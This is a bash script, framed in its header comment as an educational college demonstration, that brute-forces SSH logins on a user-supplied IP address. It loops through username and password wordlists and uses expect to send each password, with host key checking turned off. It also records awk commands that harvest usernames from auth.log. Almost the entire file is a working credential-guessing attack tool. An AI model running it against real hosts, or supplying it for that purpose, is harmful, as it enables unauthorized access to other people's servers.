#!/bin/bash
#
# USER NOTE:
# This is for educational purposes only. I created this back in college 
# to demonstrate that you should absolutely not use password authentication 
# on linux boxes.
#
# CLASS NOTE:
# Using the project1 auth.log search script, I took that output and ran these awk lines
# awk '{ if ($8 !~ "invalid") print $8; else print $10; }' project1_output > duplicates
# awk'!_[$1]++' duplicates > commonusers.txt

rd=$(tput setaf 1)
gr=$(tput setaf 2)
yl=$(tput setaf 3)
cy=$(tput setaf 6)
re=$(tput sgr0)

namelist="commonusers.txt"
passlist="commonpasses.txt"

num1=$(wc -l $namelist | awk '{print $1}')
num2=$(wc -l $passlist | awk '{print $1}')

if [ $# -eq 0 ]; then
    echo "${rd}[-]${re} Please specify the ip to attack as the first argument"
    echo "Example: ./$(basename $0) 192.168.1.2"
    exit
fi

IP=$1

echo "Total number of pass/user combinations are $(($num1*$num2))"
echo "${yl}[-]${re} Continue? [Yy] "
read input

if [[ ${input} = "Y" || ${input} = "y" ]]
then
    trap "exit" INT
    while read -r name; do
        while read -r pass; do
            echo "+----------------------+"
            echo "Trying name: ${yl}$name${re} and pass: ${cy}$pass${re}"
            expect -c "
                spawn ssh -o StrictHostKeyChecking=no $name@$IP
                expect password: { send $pass\r }   
                expect .* {}
                exit
            "
            echo ''
            echo "+----------------------+"
            echo ''
        done < ${passlist}
    done < ${namelist}
    echo "${gr}[+]${re} Brute force completed"
else
    echo "Exiting..." 
fi
